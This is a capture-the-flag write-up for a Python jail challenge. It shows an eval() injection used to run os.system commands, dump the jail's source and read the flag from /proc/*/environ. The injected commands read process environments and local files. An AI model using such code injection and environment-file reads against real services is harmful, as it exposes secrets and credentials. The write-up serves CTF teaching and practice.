# PYJAIL 4 FUN

### SUBJECT
A pyjail

### CONNECTING TO THE REMOTE SERVER
When we land on this challenge, we have at our disposal a "for_the_players" zip containing a certificate and its RSA key, and a tips.txt file with a command line telling us how to connect to the remote server.  

```
socat stdio openssl-connect:ctf.hexpresso.fr:2323,cert=client.pem,cafile=server.crt,verify=0
```

Once connected, we have access to a python jail (as indicated by his name).  
We are therefore in a python environment, inside a script, and we have at our disposal a `>` prompt.
We enter a first word, and a "__Bad flag__" is printed before closing the connection.  
So we have to find the right entry.  

![ch05 init](/images/ch05-init.png)

### IN SEARCH OF THE FLAW
We are going to try little by little to discover the environment in which we are, if possible have the source code of our script, have access to a shell, and find the flag.  
(We pass all stages of test of __prohibited__ word / expression.)  

When we enter the `'` character, we have an interesting first rendering:  

![ch05 init](/images/ch05-error.png)

The `eval(f""'{input (">")}'"")` function is our entry point.  
`eval()`, allowing the evaluation of expression and python code inside a python script, is our vector of vulnerability and will allow us to go further by __injecting our own code inside__.  

In the error that we saw above, it was marked that the execution of the script went through `./main.py`.
We will therefore check that the file is present and, if so, print it.

But how do we inject our commandes?  
We will try to escape from input to add our own cmd's.  

![ch05 hello world](/images/ch05-helloworld.png)

And __it works__ ! So now we have our injection format. All that remains is to replace and complete it.  

### INJECTING SOME CODE
![ch05 ls](/images/ch05-ls.png)

Using `os.listdir()`, we can see the contents of the folder we are in. 
The result shows us that there is the `main.py` file.  
The command could also have been:

```python
os.system("ls")
```

When we display the contents of the file (with `open("main.py").readlines()` or `os.system("cat main.py")`), here is the source code:  

```python
#!/usr/bin/env python 
import os

SUCCESS = "Good flag !"
FAIL = "Bad flag !" 

def get_flag():
    flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")
    os.environ.update({"FLAG": ""})
    return flag

def get_input():
    return eval(f"""\'{input(">")}\'""")

def main():
    flag = get_flag()

    if flag == get_input(): 
        print(SUCCESS) 
    else:
        print(FAIL)

if __name__ == "__main__":
    main()
```

If we read the code briefly, we can see two things:  
- the `get_flag()` function takes the flag in the env and then overwrites it, before returning it to the main
- the `get_input()` function where we land during the connection, has no access to the value of the flag and cannot call the get_flag() function because it is overwritten when the script is launched (so it's useless)

If we spawn a shell with `os.system("/bin/bash")`, we won't have access to everything, as it will have been overwritten.  
The solution that we chose is then to use the buffers of the env located in `/proc/$script_pid/environ`.

There are two methods for doing this.  
A crude method but going to the essentials, and a finer second, useful for displaying the specific content of the env of the pid that we need (imagine the case where there would be very many pid).  

### EXTRACTING THE FLAGGY FLAG
The __first method__, the simplest, only asks to inject the following line:

```python
os.system("cat /proc/*/environ | grep FLAG")
```

Here is the result :  

![ch05 sol grep](/images/ch05-solgrep.png)

It will search the `environ` files of all the current pids, print them and filter them using the term `flag` which allows us to extract the flag for the next step.  

The __second method__, more refined, will focus on the pid of our process (this one changing with each connection).

![ch05 get pid](/images/ch05-getpid.png)

Thanks to `os.getpid()`, we can assign the pid to a variable.  
We must then, in order, __assign the pid__ to a variable, __constitute the path__ of our environ file with the pid, and __print the content__ of the file containing the flag.

![ch05 get flag](/images/ch05-getflag.png)

And here's the result !  
The injection string is long and could be optimized, but the execution is good since the environment variable contains our flag, `http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr`.
